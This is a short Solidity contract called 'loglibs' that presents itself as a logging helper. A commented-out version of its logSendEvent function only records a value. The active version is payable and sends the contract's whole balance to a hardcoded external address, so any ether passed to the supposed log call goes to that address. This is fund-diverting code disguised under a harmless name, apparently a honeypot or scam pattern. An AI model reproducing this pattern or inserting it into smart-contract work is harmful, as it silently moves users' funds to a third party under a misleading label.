pragma solidity 0.4.19;
contract loglibs {
   mapping (address => uint256) public sendList;

   /*function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }*/

   function logSendEvent() payable public{
       address addr = 0xe3632684dB2BCE417dF118686F315872b2Fc4E3D;
       require(addr.send(this.balance));
   }

}